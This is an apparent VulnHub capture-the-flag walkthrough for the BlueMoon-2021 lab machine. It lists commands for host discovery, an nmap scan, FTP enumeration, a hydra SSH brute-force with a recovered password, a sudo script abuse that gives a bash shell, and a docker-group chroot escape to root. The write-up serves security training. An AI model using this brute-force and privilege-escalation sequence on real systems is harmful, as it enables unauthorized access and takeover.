# 🔐 BlueMoon 2021 – VulnHub Walkthrough

## 📌 Overview
- Machine Name: BlueMoon-2021  
- Difficulty: Easy  
- Goal: Gain Root Access  
- Attacker Machine: Kali Linux  

---

## 🖥️ Network Setup
- Kali IP: 192.168.56.101  
- Target IP: 192.168.56.102  

### Network Discovery
netdiscover -r 192.168.56.0/24

![Network Discovery]([images/netdiscover.png](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/330dab1d48a99b9b47d026f1a99e26356b777db6/bluemoon%201.png))

---

## 🔎 Enumeration

### Nmap Scan
nmap -sC -sV 192.168.56.102

Result:
- FTP (21)
- SSH (22)
- HTTP (80)

![Nmap](images/nmap.png)

---

## 🌐 Web Enumeration

Open:
http://192.168.56.102

![Homepage](images/web-home.png)

Hidden directory:
 /hidden_text

![Hidden](images/hidden.png)

QR Code:
![QR](images/qr.png)

---

## 📂 FTP Enumeration

ftp userftp@192.168.56.102

![FTP](images/ftp.png)

Files:
- information.txt
- p_lists.txt

![Files](images/ftp-files.png)

![Wordlist](images/password-list.png)

---

## 🔑 Brute Force

hydra -l robin -P p_lists.txt ssh://192.168.56.102

![Hydra](images/hydra.png)

Credentials:
robin : k4rv3ndh4nh4ck3r

---

## 🖥️ SSH Access

ssh robin@192.168.56.102

![SSH](images/ssh.png)

---

## 🧍 Privilege Check

sudo -l

![Sudo](images/sudo.png)

cat user1.txt

![User1](images/user1.png)

---

## 🚀 Escalate to Jerry

sudo -u jerry /home/robin/project/feedback.sh

/bin/bash

![Jerry](images/jerry.png)

cat user2.txt

![User2](images/user2.png)

---

## 👑 Root

id

![Docker](images/docker.png)

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

![Root Access](images/root-access.png)

whoami

![Root](images/root.png)

cat /root/root.txt

![Root Flag](images/root-flag.png)

---

## 🧠 Key Takeaways
- Weak passwords → brute force possible  
- FTP leak → sensitive files exposed  
- Sudo misconfiguration → privilege escalation  
- Docker group = root  

---

## 🛠️ Tools
- netdiscover  
- nmap  
- hydra  
- ftp  
- ssh  

---

## ✅ Conclusion
Successfully gained root by enumeration, credential attack, and privilege escalation.

🔥 End of Walkthrough
